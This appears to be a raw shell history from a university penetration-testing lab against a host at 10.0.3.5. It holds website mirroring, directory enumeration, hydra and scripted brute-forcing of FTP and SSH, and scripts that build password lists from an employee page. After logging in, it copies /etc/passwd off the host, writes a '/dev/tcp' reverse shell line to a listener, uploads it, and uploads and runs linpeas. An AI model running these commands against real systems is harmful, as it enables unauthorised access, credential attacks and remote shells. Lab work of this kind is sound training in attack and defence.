wget --mirror --convert-links --adjust-extension --page-requisites --no-parent --no-proxy http://10.0.3.5
ls
cd 10.0.3.5
find .
ls
cat css
cd css/
ls
cat estilos.css 
cd ..
ls
grep -Rin "TODO\|FIXME\|password\|admin\|test" .
find . | grep -Ei '\.bak|\.old|\.tmp|\.swp|~$|backup'
grep -Rin "hackme\|admin\|intranet\|ssh" .
cd ..
ls
curl --noproxy '*' http://10.0.3.5/robots.txt
curl --noproxy '*' http://10.0.3.5/sitemap.xml
ls
cd ..
cd
ls
cd archivos/
ls
hydra -L usuarios.txt -P <(echo "unouno"; echo "casa23") ssh://10.0.3.5 -t 1 -f
nmap -p- 10.0.3.5 --min-rate 1000
ftp 10.0.3.5
ftp -v 10.0.3.5
exit
cd archivos/
ls
hydra -L usuarios.txt -P usuarios.txt ftp://10.0.3.5 -t 1 -W 2 -V
exit
while read user; do     echo "Probando $user : $user"
    echo -e "user $user $user\nquit" | ftp -n 10.0.3.5 2>&1 | grep -q "230" && echo ">>> ¡ENCONTRADO! $user : $user <<<" && break; done < usuarios.txt
cd archivos/
while read user; do     echo "Probando $user : $user"
    echo -e "user $user $user\nquit" | ftp -n 10.0.3.5 2>&1 | grep -q "230" && echo ">>> ¡ENCONTRADO! $user : $user <<<" && break; done < usuarios.txt
clear
ftp -n 10.0.3.5 << EOF
user eacosta eacosta
quit
EOF

ftp -n 10.0.3.5 << EOF
user asdfawsef asefasf
quit
EOF

exit
ls
cd archivos/
ls
cd evidencia_web/
ls
cd 10.0.3.5/
ls
tree
cd css/
ls
cd ~/archivos/evidencia_web/10.0.3.5
# Buscar palabras clave en todos los archivos
grep -rni "password\|pass\|contraseña\|key\|secret\|unouno\|casa23" .
# Buscar en comentarios HTML
# Revisar el CSS por comentarios
cat css/estilos.css | grep -i "pass\|key\|secret"
# Listar archivos ocultos
ls -la
find . -type f -name ".*"
# Buscar emails o patrones de usuario
grep -oP '[a-z]+@[a-z.]+' empleados.html | sort -u
# Buscar números que parezcan IDs o contraseñas
grep -oP '\b[0-9]{4,}\b' empleados.html
clear
grep -oP '\b[0-9]{4,}\b' empleados.html
# Buscar el número 4334077 en el HTML con contexto
grep -n "4334077" empleados.html
# Ver las líneas alrededor
grep -B5 -A5 "4334077" empleados.html
# Probar gdamo con 4334077
echo -e "user gdamo 4334077\nquit" | ftp -n 10.0.3.5 2>&1
# Probar oevequoz con 4334077
echo -e "user oevequoz 4334077\nquit" | ftp -n 10.0.3.5 2>&1
# Probar nmacgarry con 4334077
echo -e "user nmacgarry 4334077\nquit" | ftp -n 10.0.3.5 2>&1
# Probar otrettel con 4334077
echo -e "user otrettel 4334077\nquit" | ftp -n 10.0.3.5 2>&1
clear
# Probar con números de otras columnas (3046, 2025)
for user in gdamo oevequoz nmacgarry otrettel; do     echo "=== $user : 3046 ===";     echo -e "user $user 3046\nquit" | ftp -n 10.0.3.5 2>&1 | grep "230\|530";     echo "=== $user : 2025 ===";     echo -e "user $user 2025\nquit" | ftp -n 10.0.3.5 2>&1 | grep "230\|530"; done
cd ..
mkdir aaa
cd aaa/
wget --mirror --convert-links --adjust-extension --page-requisites --no-parent --no-proxy http://10.0.3.5
# Buscar directorios y archivos comunes
gobuster dir -u http://10.0.3.5 -w /usr/share/wordlists/dirb/common.txt --no-proxy
# Si no tenés wordlist, podés usar una pequeña
gobuster dir -u http://10.0.3.5 -w /usr/share/wordlists/dirb/big.txt --no-proxy
dirb http://10.0.3.5 /usr/share/wordlists/dirb/common.txt -p ""
# Crear wordlist manual de extensiones comunes
for ext in bak old txt save backup sql conf config; do     gobuster dir -u http://10.0.3.5 -w /usr/share/wordlists/dirb/common.txt -x $ext --no-proxy; done
grep -rni "password\|pass\|key\|secret\|token" 10.0.3.5/
cat > wordlist.txt << 'EOF'
admin
backup
backups
backup.zip
backup.tar.gz
.git
.git/config
.htaccess
.htpasswd
robots.txt
sitemap.xml
secret
hidden
test
dev
old
temp
tmp
passwords
passwords.txt
credenciales
credenciales.txt
notes
notes.txt
readme
readme.txt
staff
empleados
users
userlist
config
config.php
config.ini
.bak
.old
.swp
EOF

while read path; do     url="http://10.0.3.5/$path";     status=$(curl --noproxy '*' -o /dev/null -s -w "%{http_code}" "$url");     if [ "$status" = "200" ] || [ "$status" = "403" ]; then         echo "[$status] $url";     fi; done < wordlist.txt
# Ver el encabezado completo de .htaccess
curl --noproxy '*' -I http://10.0.3.5/.htaccess
# Intentar leerlo como texto (a veces está mal configurado)
curl --noproxy '*' http://10.0.3.5/.htaccess
# Probar con autenticación básica vacía
curl --noproxy '*' -u test:test http://10.0.3.5/.htaccess
# Intentar bajar .htpasswd
curl --noproxy '*' http://10.0.3.5/.htpasswd
# Buscar backups comunes
for backup in backup backups old temp tmp; do     echo "Probando /$backup/";     curl --noproxy '*' -I http://10.0.3.5/$backup/ 2>/dev/null | head -1; done
curl --noproxy '*' -v http://10.0.3.5/.htpasswd 2>&1 | grep -E "HTTP|403|401"
# Variaciones del 4334077
passwords="4334077 7703344 gdamo4334077 4334077gdamo gdamo2025 2025gdamo"
for pass in $passwords; do     echo "Probando gdamo : $pass"
    echo -e "user gdamo $pass\nquit" | ftp -n 10.0.3.5 2>&1 | grep -q "230" && echo ">>> ENCONTRADO: gdamo:$pass <<<"; done
clear
# Probar FTP con email completo
echo -e "user eaosta@hackme.org 4334077\nquit" | ftp -n 10.0.3.5 2>&1
echo -e "user eaosta@hackme.fsi.org 4334077\nquit" | ftp -n 10.0.3.5 2>&1
cd
cd archivos/
ls
mkdir ataqe
cd ataqe/
ls
vi usuarios_correo.txt
cat
clear
cat usuarios_correo.txt 
cat > pass_faciles.txt << 'EOF'
unouno
casa23
EOF

hydra -L usuarios_final.txt -P pass_faciles.txt ftp://10.0.3.5 -t 4 -V -o resultado_unouno_casa23.txt
hydra -L usuarios_correo.txt -P pass_faciles.txt ftp://10.0.3.5 -t 4 -V -o resultado_unouno_casa23.txt
cat > pass_mnicotra.txt << 'EOF'
3046
4333046
mnicotra
unouno
casa23
EOF

hydra -l mnicotra -P pass_mnicotra.txt ftp://10.0.3.5 -t 1 -V -o resultado_mnicotra.txt
hydra -l mnicotra@hackme.fsi.org pass_mnicotra.txt ftp://10.0.3.5 -t 1 -V -o mnicotra_test.txt
hydra -l mnicotra@hackme.fsi.org pass_mnicotra.txt ftp://10.0.3.5 -t 1 -V -o mnicotra_test.txt# Probar SSH con mnicotra
sshpass -p "3046" ssh -o ConnectTimeout=5 mnicotra@10.0.3.5
sshpass -p "4333046" ssh -o ConnectTimeout=5 mnicotra@10.0.3.5
sshpass -p "mnicotra" ssh -o ConnectTimeout=5 mnicotra@10.0.3.5
# Crear lista de los 4
cat > usuarios_4334.txt << EOF
gdamo
oevequoz
nmacgarry
otrettel
EOF

# Atacar FTP (más rápido)
hydra -L usuarios_4334.txt -P dic.txt ftp://10.0.3.5 -t 4 -V -o resultado_4334.txt
ls
cd archivos/
ls
cat dict.txt 
lear
clear
exit
ls
# Descargar todo el directorio 'archivos' desde el remoto a tu workspace
scp -r fsi@164.73.44.3:~/archivos /home/armadillo/Documents/4_Proyectos/3_academico/PROYECTO_FSI/FSI_2026_Laboratorios/Laboratorios/Laboratorio\ 2/workspace/
clear
exit
watch -n 1 'tail -20 ~/archivos/ataques_triviales/resultados_triviales.txt'
watch -n 5 'cat ~/archivos/ataques_triviales/resultados_triviales.txt'
watch -n 1 'cat ~/archivos/ataques_triviales/resultados_triviales.txt'
tail -f ~/archivos/ataques_triviales/resultados_triviales.txt
wc -l ~/archivos/ataques_triviales/resultados_triviales.txt
watch -n 1 'cat ~/archivos/ataques_triviales/resultados_triviales.txt'
lear
clear
nc -lvnp 4444
cd archivos/
ls
cd ataques_triviales/
ls
cat resultados_espanol_2.txt 
cat combinaciones_espanol_2.txt 
cd ..
ls
cd ataq
cd ataques_triviales/
ls
vi empleados.html
#!/bin/bash
# Script para generar contraseñas desde empleados.html
# Ejecutar en ~/archivos/ataques_triviales/
cd ~/archivos/ataques_triviales
# Archivos de salida
COMBINACIONES="combinaciones_numeros_internos.txt"
PASSWORDS_NUEVAS="passwords_nuevas.txt"
# Limpiar archivos anteriores
> $COMBINACIONES
> $PASSWORDS_NUEVAS
echo "=== Generando contraseñas desde empleados.html ==="
# Extraer información del HTML
grep -oP '(?<=<B>)[^<]+' ../../empleados.html | sed 's/,//g' > apellidos_temp.txt
grep -oP '(?<=<B>[^<]+,\s*)[^<]+' ../../empleados.html > nombres_temp.txt
grep -oP '[a-z]+@hackme\.org' ../../empleados.html > emails_temp.txt
grep -oP '<TD WIDTH=365>\s*<P>\s*\K[0-9]+' ../../empleados.html > internos_temp.txt
# Leer línea por línea (asumiendo mismo orden)
paste apellidos_temp.txt nombres_temp.txt emails_temp.txt internos_temp.txt > empleados_data.txt
while IFS=$'\t' read -r apellido nombre email interno; do     [ -z "$apellido" ] && continue    
    apellido=$(echo "$apellido" | xargs | tr '[:upper:]' '[:lower:]');     nombre=$(echo "$nombre" | xargs | tr '[:upper:]' '[:lower:]');     email=$(echo "$email" | xargs | tr '[:upper:]' '[:lower:]');     interno=$(echo "$interno" | xargs)    
    usuario=$(echo "$email" | cut -d'@' -f1)         echo "Procesando: $apellido, $nombre -> $usuario (interno: $interno)"    
    
    if [ -n "$interno" ]; then         echo "$usuario:$interno" >> $COMBINACIONES;         echo "$usuario:${usuario}${interno}" >> $COMBINACIONES;         echo "$usuario:${apellido}${interno}" >> $COMBINACIONES;         echo "$usuario:${nombre}${interno}" >> $COMBINACIONES;     fi    
    echo "$usuario:123" >> $COMBINACIONES;     echo "$usuario:1234" >> $COMBINACIONES;     echo "$usuario:12345" >> $COMBINACIONES;     echo "$usuario:123456" >> $COMBINACIONES    
    for year in 2024 2023 2025 2022 2021; do         echo "$usuario:$year" >> $COMBINACIONES;         echo "$usuario:${usuario}$year" >> $COMBINACIONES;         echo "$usuario:${apellido}$year" >> $COMBINACIONES;     done    
    if [ -n "$interno" ]; then         echo "$usuario:$interno" >> $COMBINACIONES;     fi    
    echo "$usuario:$usuario" >> $COMBINACIONES    
    echo "$usuario:$apellido" >> $COMBINACIONES    
    if [ -n "$nombre" ]; then         echo "$usuario:$nombre" >> $COMBINACIONES;     fi    
    echo "$usuario:$email" >> $COMBINACIONES    
    if [ -n "$interno" ]; then         echo "$usuario:${interno}${usuario}" >> $COMBINACIONES;     fi    
    if [ -n "$interno" ]; then         echo "$usuario:${apellido}${interno}" >> $COMBINACIONES;         echo "$usuario:${apellido}${interno}${interno}" >> $COMBINACIONES;     fi     done < empleados_data.txt
# También generar contraseñas SOLAS (sin usuario, para usar con -P)
echo "=== Generando archivo de passwords solas ==="
# Extraer todos los números internos únicos
grep -oP '<TD WIDTH=365>\s*<P>\s*\K[0-9]+' ../../empleados.html | sort -u >> $PASSWORDS_NUEVAS
# Añadir patrones comunes
cat >> $PASSWORDS_NUEVAS << 'EOF'
123
1234
12345
123456
1234567
12345678
123456789
1234567890
password
admin
root
hackme
empresa
2024
2023
2025
qwerty
abc123
monkey
dragon
master
sunshine
football
iloveyou
whatever
654321
qwerty123
passw0rd
admin123
123123
welcome
letmein
000000
111111
222222
333333
555555
777777
888888
999999
asdfgh
zxcvbn
q1w2e3
a1b2c3
zaq1xsw2
1qaz2wsx
qazwsx
123qwe
321qwe
123abc
abc123456
987654321
password123
112233
121212
131313
141414
151515
EOF

# Eliminar duplicados
sort -u $COMBINACIONES -o $COMBINACIONES
sort -u $PASSWORDS_NUEVAS -o $PASSWORDS_NUEVAS
echo ""
echo "=== RESUMEN ==="
echo "Combinaciones usuario:contraseña generadas: $(wc -l < $COMBINACIONES)"
echo "Contraseñas solas generadas: $(wc -l < $PASSWORDS_NUEVAS)"
echo ""
echo "Archivos creados:"
echo "  - $COMBINACIONES"
echo "  - $PASSWORDS_NUEVAS"
cd ~/archivos/ataques_triviales
# Verificar que empleados.html está aquí
ls -la empleados.html
# Script corregido (usando archivo local)
cat > generar_passwords.sh << 'EOF'
#!/bin/bash

cd ~/archivos/ataques_triviales

COMBINACIONES="combinaciones_numeros_internos.txt"
PASSWORDS_NUEVAS="passwords_nuevas.txt"

> $COMBINACIONES
> $PASSWORDS_NUEVAS

echo "=== Generando contraseñas desde empleados.html ==="

# Extraer apellidos (lo que está en <B>)
grep -oP '<B>\K[^<]+' empleados.html | sed 's/,//g' > apellidos_temp.txt

# Extraer nombres (después de la coma)
grep -oP '<B>[^<]+,\s*\K[^<]+' empleados.html > nombres_temp.txt

# Extraer emails
grep -oP '[a-z]+@hackme\.org' empleados.html > emails_temp.txt

# Extraer números internos (solo dígitos)
grep -oP '<TD WIDTH=365>\s*<P>\s*\K[0-9]+' empleados.html > internos_temp.txt

# Mostrar cuántos de cada uno
echo "Apellidos: $(wc -l < apellidos_temp.txt)"
echo "Nombres: $(wc -l < nombres_temp.txt)"
echo "Emails: $(wc -l < emails_temp.txt)"
echo "Internos: $(wc -l < internos_temp.txt)"

# Combinar
paste apellidos_temp.txt nombres_temp.txt emails_temp.txt internos_temp.txt > empleados_data.txt

while IFS=$'\t' read -r apellido nombre email interno; do
    [ -z "$apellido" ] && continue
    
    apellido=$(echo "$apellido" | xargs | tr '[:upper:]' '[:lower:]')
    nombre=$(echo "$nombre" | xargs | tr '[:upper:]' '[:lower:]')
    email=$(echo "$email" | xargs | tr '[:upper:]' '[:lower:]')
    interno=$(echo "$interno" | xargs)
    
    # Usuario desde email (parte antes del @)
    usuario=$(echo "$email" | cut -d'@' -f1)
    
    # Saltar si no hay usuario
    [ -z "$usuario" ] && continue
    
    echo "Procesando: $usuario (interno: $interno)"
    
    # === COMBINACIONES ===
    
    # 1. Usuario + número interno
    if [ -n "$interno" ]; then
        echo "$usuario:$interno" >> $COMBINACIONES
        echo "$usuario:${usuario}${interno}" >> $COMBINACIONES
        echo "$usuario:${apellido}${interno}" >> $COMBINACIONES
        echo "$usuario:${interno}${usuario}" >> $COMBINACIONES
    fi
    
    # 2. Usuario + números simples
    for num in 123 1234 12345 123456; do
        echo "$usuario:$num" >> $COMBINACIONES
        echo "$usuario:${usuario}$num" >> $COMBINACIONES
    done
    
    # 3. Años
    for year in 2024 2023 2025 2022 2021 2020; do
        echo "$usuario:$year" >> $COMBINACIONES
        echo "$usuario:${usuario}$year" >> $COMBINACIONES
        echo "$usuario:${apellido}$year" >> $COMBINACIONES
    done
    
    # 4. Usuario = contraseña
    echo "$usuario:$usuario" >> $COMBINACIONES
    
    # 5. Apellido como contraseña
    if [ -n "$apellido" ]; then
        echo "$usuario:$apellido" >> $COMBINACIONES
    fi
    
    # 6. Nombre como contraseña
    if [ -n "$nombre" ]; then
        echo "$usuario:$nombre" >> $COMBINACIONES
    fi
    
    # 7. Email completo como contraseña
    if [ -n "$email" ]; then
        echo "$usuario:$email" >> $COMBINACIONES
    fi
    
done < empleados_data.txt

# Generar archivo de passwords solas (para usar con -P)
grep -oP '<TD WIDTH=365>\s*<P>\s*\K[0-9]+' empleados.html | sort -u >> $PASSWORDS_NUEVAS



clear
cd ~/archivos/ataques_triviales
# Verificar que empleados.html está aquí
ls -la empleados.html
# Script corregido (usando archivo local)
cat > generar_passwords.sh << 'EOF'
#!/bin/bash

cd ~/archivos/ataques_triviales

COMBINACIONES="combinaciones_numeros_internos.txt"
PASSWORDS_NUEVAS="passwords_nuevas.txt"

> $COMBINACIONES
> $PASSWORDS_NUEVAS

echo "=== Generando contraseñas desde empleados.html ==="

# Extraer apellidos (lo que está en <B>)
grep -oP '<B>\K[^<]+' empleados.html | sed 's/,//g' > apellidos_temp.txt

# Extraer nombres (después de la coma)
grep -oP '<B>[^<]+,\s*\K[^<]+' empleados.html > nombres_temp.txt

# Extraer emails
grep -oP '[a-z]+@hackme\.org' empleados.html > emails_temp.txt

# Extraer números internos (solo dígitos)
grep -oP '<TD WIDTH=365>\s*<P>\s*\K[0-9]+' empleados.html > internos_temp.txt

# Mostrar cuántos de cada uno
echo "Apellidos: $(wc -l < apellidos_temp.txt)"
echo "Nombres: $(wc -l < nombres_temp.txt)"
echo "Emails: $(wc -l < emails_temp.txt)"
echo "Internos: $(wc -l < internos_temp.txt)"

# Combinar
paste apellidos_temp.txt nombres_temp.txt emails_temp.txt internos_temp.txt > empleados_data.txt

while IFS=$'\t' read -r apellido nombre email interno; do
    [ -z "$apellido" ] && continue
    
    apellido=$(echo "$apellido" | xargs | tr '[:upper:]' '[:lower:]')
    nombre=$(echo "$nombre" | xargs | tr '[:upper:]' '[:lower:]')
    email=$(echo "$email" | xargs | tr '[:upper:]' '[:lower:]')
    interno=$(echo "$interno" | xargs)
    
    # Usuario desde email (parte antes del @)
    usuario=$(echo "$email" | cut -d'@' -f1)
    
    # Saltar si no hay usuario
    [ -z "$usuario" ] && continue
    
    echo "Procesando: $usuario (interno: $interno)"
    
    # === COMBINACIONES ===
    
    # 1. Usuario + número interno
    if [ -n "$interno" ]; then
        echo "$usuario:$interno" >> $COMBINACIONES
        echo "$usuario:${usuario}${interno}" >> $COMBINACIONES
        echo "$usuario:${apellido}${interno}" >> $COMBINACIONES
        echo "$usuario:${interno}${usuario}" >> $COMBINACIONES
    fi
    
    # 2. Usuario + números simples
    for num in 123 1234 12345 123456; do
        echo "$usuario:$num" >> $COMBINACIONES
        echo "$usuario:${usuario}$num" >> $COMBINACIONES
    done
    
    # 3. Años
    for year in 2024 2023 2025 2022 2021 2020; do
        echo "$usuario:$year" >> $COMBINACIONES
        echo "$usuario:${usuario}$year" >> $COMBINACIONES
        echo "$usuario:${apellido}$year" >> $COMBINACIONES
    done
    
    # 4. Usuario = contraseña
    echo "$usuario:$usuario" >> $COMBINACIONES
    
    # 5. Apellido como contraseña
    if [ -n "$apellido" ]; then
        echo "$usuario:$apellido" >> $COMBINACIONES
    fi
    
    # 6. Nombre como contraseña
    if [ -n "$nombre" ]; then
        echo "$usuario:$nombre" >> $COMBINACIONES
    fi
    
    # 7. Email completo como contraseña
    if [ -n "$email" ]; then
        echo "$usuario:$email" >> $COMBINACIONES
    fi
    
done < empleados_data.txt

# Generar archivo de passwords solas (para usar con -P)
grep -oP '<TD WIDTH=365>\s*<P>\s*\K[0-9]+' empleados.html | sort -u >> $PASSWORDS_NUEVAS






cd ~/archivos/ataques_triviales
# Verificar que empleados.html está aquí
ls -la empleados.html
# Script corregido (usando archivo local)
cat > generar_passwords.sh << 'EOF'
#!/bin/bash

cd ~/archivos/ataques_triviales

COMBINACIONES="combinaciones_numeros_internos.txt"
PASSWORDS_NUEVAS="passwords_nuevas.txt"

> $COMBINACIONES
> $PASSWORDS_NUEVAS

echo "=== Generando contraseñas desde empleados.html ==="

# Extraer apellidos (lo que está en <B>)
grep -oP '<B>\K[^<]+' empleados.html | sed 's/,//g' > apellidos_temp.txt

# Extraer nombres (después de la coma)
grep -oP '<B>[^<]+,\s*\K[^<]+' empleados.html > nombres_temp.txt

# Extraer emails
grep -oP '[a-z]+@hackme\.org' empleados.html > emails_temp.txt

# Extraer números internos (solo dígitos)
grep -oP '<TD WIDTH=365>\s*<P>\s*\K[0-9]+' empleados.html > internos_temp.txt

# Mostrar cuántos de cada uno
echo "Apellidos: $(wc -l < apellidos_temp.txt)"
echo "Nombres: $(wc -l < nombres_temp.txt)"
echo "Emails: $(wc -l < emails_temp.txt)"
echo "Internos: $(wc -l < internos_temp.txt)"

# Combinar
paste apellidos_temp.txt nombres_temp.txt emails_temp.txt internos_temp.txt > empleados_data.txt

while IFS=$'\t' read -r apellido nombre email interno; do
    [ -z "$apellido" ] && continue
    
    apellido=$(echo "$apellido" | xargs | tr '[:upper:]' '[:lower:]')
    nombre=$(echo "$nombre" | xargs | tr '[:upper:]' '[:lower:]')
    email=$(echo "$email" | xargs | tr '[:upper:]' '[:lower:]')
    interno=$(echo "$interno" | xargs)
    
    # Usuario desde email (parte antes del @)
    usuario=$(echo "$email" | cut -d'@' -f1)
    
    # Saltar si no hay usuario
    [ -z "$usuario" ] && continue
    
    echo "Procesando: $usuario (interno: $interno)"
    
    # === COMBINACIONES ===
    
    # 1. Usuario + número interno
    if [ -n "$interno" ]; then
        echo "$usuario:$interno" >> $COMBINACIONES
        echo "$usuario:${usuario}${interno}" >> $COMBINACIONES
        echo "$usuario:${apellido}${interno}" >> $COMBINACIONES
        echo "$usuario:${interno}${usuario}" >> $COMBINACIONES
    fi
    
    # 2. Usuario + números simples
    for num in 123 1234 12345 123456; do
        echo "$usuario:$num" >> $COMBINACIONES
        echo "$usuario:${usuario}$num" >> $COMBINACIONES
    done
    
    # 3. Años
    for year in 2024 2023 2025 2022 2021 2020; do
        echo "$usuario:$year" >> $COMBINACIONES
        echo "$usuario:${usuario}$year" >> $COMBINACIONES
        echo "$usuario:${apellido}$year" >> $COMBINACIONES
    done
    
    # 4. Usuario = contraseña
    echo "$usuario:$usuario" >> $COMBINACIONES
    
    # 5. Apellido como contraseña
    if [ -n "$apellido" ]; then
        echo "$usuario:$apellido" >> $COMBINACIONES
    fi
    
    # 6. Nombre como contraseña
    if [ -n "$nombre" ]; then
        echo "$usuario:$nombre" >> $COMBINACIONES
    fi
    
    # 7. Email completo como contraseña
    if [ -n "$email" ]; then
        echo "$usuario:$email" >> $COMBINACIONES
    fi
    
done < empleados_data.txt

/











cd ~/archivos/ataques_triviales
# Verificar que empleados.html está aquí
ls -la empleados.html
# Script corregido (usando archivo local)
cat > generar_passwords.sh << 'EOF'
#!/bin/bash

cd ~/archivos/ataques_triviales

COMBINACIONES="combinaciones_numeros_internos.txt"
PASSWORDS_NUEVAS="passwords_nuevas.txt"

> $COMBINACIONES
> $PASSWORDS_NUEVAS

echo "=== Generando contraseñas desde empleados.html ==="

# Extraer apellidos (lo que está en <B>)
grep -oP '<B>\K[^<]+' empleados.html | sed 's/,//g' > apellidos_temp.txt

# Extraer nombres (después de la coma)
grep -oP '<B>[^<]+,\s*\K[^<]+' empleados.html > nombres_temp.txt

# Extraer emails
grep -oP '[a-z]+@hackme\.org' empleados.html > emails_temp.txt

# Extraer números internos (solo dígitos)
grep -oP '<TD WIDTH=365>\s*<P>\s*\K[0-9]+' empleados.html > internos_temp.txt

# Mostrar cuántos de cada uno
echo "Apellidos: $(wc -l < apellidos_temp.txt)"
echo "Nombres: $(wc -l < nombres_temp.txt)"
echo "Emails: $(wc -l < emails_temp.txt)"
echo "Internos: $(wc -l < internos_temp.txt)"

# Combinar
paste apellidos_temp.txt nombres_temp.txt emails_temp.txt internos_temp.txt > empleados_data.txt

while IFS=$'\t' read -r apellido nombre email interno; do
    [ -z "$apellido" ] && continue
    
    apellido=$(echo "$apellido" | xargs | tr '[:upper:]' '[:lower:]')
    nombre=$(echo "$nombre" | xargs | tr '[:upper:]' '[:lower:]')
    email=$(echo "$email" | xargs | tr '[:upper:]' '[:lower:]')
    interno=$(echo "$interno" | xargs)
    
    # Usuario desde email (parte antes del @)
    usuario=$(echo "$email" | cut -d'@' -f1)
    
    # Saltar si no hay usuario
    [ -z "$usuario" ] && continue
    
    echo "Procesando: $usuario (interno: $interno)"
    
    # === COMBINACIONES ===
    
    # 1. Usuario + número interno
    if [ -n "$interno" ]; then
        echo "$usuario:$interno" >> $COMBINACIONES
        echo "$usuario:${usuario}${interno}" >> $COMBINACIONES
        echo "$usuario:${apellido}${interno}" >> $COMBINACIONES
        echo "$usuario:${interno}${usuario}" >> $COMBINACIONES
    fi
    
    # 2. Usuario + números simples
    for num in 123 1234 12345 123456; do
        echo "$usuario:$num" >> $COMBINACIONES
        echo "$usuario:${usuario}$num" >> $COMBINACIONES
    done
    
    # 3. Años
    for year in 2024 2023 2025 2022 2021 2020; do
        echo "$usuario:$year" >> $COMBINACIONES
        echo "$usuario:${usuario}$year" >> $COMBINACIONES
        echo "$usuario:${apellido}$year" >> $COMBINACIONES
    done
    
    # 4. Usuario = contraseña
    echo "$usuario:$usuario" >> $COMBINACIONES
    
    # 5. Apellido como contraseña
    if [ -n "$apellido" ]; then
        echo "$usuario:$apellido" >> $COMBINACIONES
    fi
    
    # 6. Nombre como contraseña
    if [ -n "$nombre" ]; then
        echo "$usuario:$nombre" >> $COMBINACIONES
    fi
    
    # 7. Email completo como contraseña
    if [ -n "$email" ]; then
        echo "$usuario:$email" >> $COMBINACIONES
    fi
    
done < empleados_data.txt

# Generar archivo de passwords solas (para usar con -P)
grep -oP '<TD WIDTH=365>\s*<P>\s*\K[0-9]+' empleados.html | sort -u >> $PASSWORDS_NUEVAS

# Añadir patrones comunes
cat >> $PASSWORDS_NUEVAS << 'EOF'
uno
dos
tres
cuatro
cinco 
seis
siete
ocho
nueve
cero
secreto
EOF

# Limpiar duplicados
sort -u $COMBINACIONES -o $COMBINACIONES
sort -u $PASSWORDS_NUEVAS -o $PASSWORDS_NUEVAS
echo ""
echo "=== RESUMEN ==="
echo "Combinaciones usuario:contraseña: $(wc -l < $COMBINACIONES)"
echo "Contraseñas solas: $(wc -l < $PASSWORDS_NUEVAS)"
echo ""
echo "Archivos: $COMBINACIONES y $PASSWORDS_NUEVAS"
# Limpiar temporales
rm -f apellidos_temp.txt nombres_temp.txt emails_temp.txt internos_temp.txt empleados_data.txt
EOF
# Dar permisos y ejecutar
chmod +x generar_passwords.sh
./generar_passwords.sh
cd ~/archivos/ataques_triviales
# Script simplificado
cat > generar_simple.sh << 'SCRIPT'
#!/bin/bash

cd ~/archivos/ataques_triviales

COMBINACIONES="combos_internos.txt"
PASSWORDS="passwords_internos.txt"

> $COMBINACIONES
> $PASSWORDS

echo "=== Generando desde empleados.html ==="

# 1. Extraer usuarios de los emails (formato: eaosta, racosta, etc)
grep -oP '[a-z]+@hackme\.org' empleados.html | cut -d'@' -f1 | sort -u > usuarios_emails.txt
echo "Usuarios desde emails: $(wc -l < usuarios_emails.txt)"

# 2. Extraer números internos (cualquier número de 3-7 dígitos)
grep -oP '[0-9]{3,7}' empleados.html | sort -u > internos_raw.txt
# Filtrar números que parecen teléfonos internos (3-4 dígitos normalmente)
grep -E '^[0-9]{3,4}$' internos_raw.txt | sort -u > internos.txt
echo "Números internos: $(wc -l < internos.txt)"

# 3. Extraer apellidos (en mayúsculas dentro de <B>)
grep -oP '<B>\K[A-Z]+' empleados.html | tr '[:upper:]' '[:lower:]' | sort -u > apellidos.txt
echo "Apellidos: $(wc -l < apellidos.txt)"

echo ""
echo "=== Generando combinaciones ==="

# Para cada usuario
while read user; do
    [ -z "$user" ] && continue
    
    # Usuario + números simples
    for num in 123 1234 12345 123456; do
        echo "$user:$num" >> $COMBINACIONES
        echo "$user:${user}$num" >> $COMBINACIONES
    done
    
    # Usuario = contraseña
    echo "$user:$user" >> $COMBINACIONES
    
    # Usuario + año
    for year in 2024 2023 2025 2022; do
        echo "$user:$year" >> $COMBINACIONES
        echo "$user:${user}$year" >> $COMBINACIONES
    done
    
    # Usuario + número interno
    while read interno; do
        echo "$user:$interno" >> $COMBINACIONES
        echo "$user:${user}$interno" >> $COMBINACIONES
    done < internos.txt
    
done < usuarios_emails.txt

# También generar combinaciones con apellidos como contraseña
while read user; do
    while read apellido; do
        echo "$user:$apellido" >> $COMBINACIONES
        echo "$user:${apellido}123" >> $COMBINACIONES
        echo "$user:${apellido}2024" >> $COMBINACIONES
    done < apellidos.txt
done < usuarios_emails.txt

# Añadir patrones comunes
cat >> $PASSWORDS_NUEVAS << 'EOF'
uno
dos
tres
cuatro
cinco 
seis
siete
ocho
nueve
cero
secreto
EOF


sort -u $COMBINACIONES -o $COMBINACIONES
sort -u $PASSWORDS -o $PASSWORDS

echo ""
echo "=== RESULTADOS ==="
echo "Combinaciones usuario:contraseña: $(wc -l < $COMBINACIONES)"
echo "Contraseñas solas: $(wc -l < $PASSWORDS)"
echo ""
echo "Primeras 10 combinaciones:"
head -10 $COMBINACIONES

SCRIPT

chmod +x generar_simple.sh
./generar_simple.sh
ls
cat 
clear
hydra -C combos_internos.txt ssh://10.0.3.5 -t 4 -v -o resultado_completo.txt
hydra -R
cd archivos/
ls
cd ataques_triviales/
ls
cat hydra.restore 
clear
strings hydra.restore | grep -E '^[a-z]+:[0-9]+' | head -20
ls
# Opción 1: Eliminar restore y empezar desde cero
rm -f hydra.restore
hydra -C combos_internos.txt ssh://10.0.3.5 -t 4 -v
# Opción 2: Probar SOLO nmacgarry manualmente para confirmar
echo "nmacgarry:123" > test_nmacgarry.txt
hydra -C test_nmacgarry.txt ssh://10.0.3.5 -t 1 -v
# Opción 3: Verificar manualmente (la más confiable)
ssh nmacgarry@10.0.3.5
# Cuando pida contraseña, escribe 123
clear
cat > test_nmacgarry.txt << 'EOF'
nmacgarry:123
nmacgarry:1234
nmacgarry:nmacgarry
nmacgarry:macgarry
nmacgarry:nora123
EOF

hydra -C test_nmacgarry.txt ssh://10.0.3.5 -t 1 -v -o test_resultado.txt
ssh nmacgarry@10.0.3.5 "cat /etc/passwd | grep nmacgarry"
# Descargar archivos de la víctima
scp nmacgarry@10.0.3.5:/etc/passwd ./passwd_victima.txt
scp nmacgarry@10.0.3.5:/etc/group ./group_victima.txt
scp nmacgarry@10.0.3.5:/etc/hostname ./hostname.txt
# Subir archivos (para plantar un reverse shell)
echo 'bash -i >& /dev/tcp/10.0.3.4/4444 0>&1' > shell.sh
scp shell.sh nmacgarry@10.0.3.5:/tmp/
sftp nmacgarry@10.0.3.5
# Dentro: ls, get, put, cd, etc.
# Si puedes ejecutar comandos, busca binarios SUID
ssh nmacgarry@10.0.3.5 "find / -perm -4000 2>/dev/null"
# Si no, usa scp para copiar el binario linpeas y ejecutarlo (si tienes ejecución)
scp /usr/local/bin/linpeas.sh nmacgarry@10.0.3.5:/tmp/
ssh nmacgarry@10.0.3.5 "bash /tmp/linpeas.sh" 2>&1 | tee linpeas_output.txt
# Intentar leer /etc/shadow (necesita root)
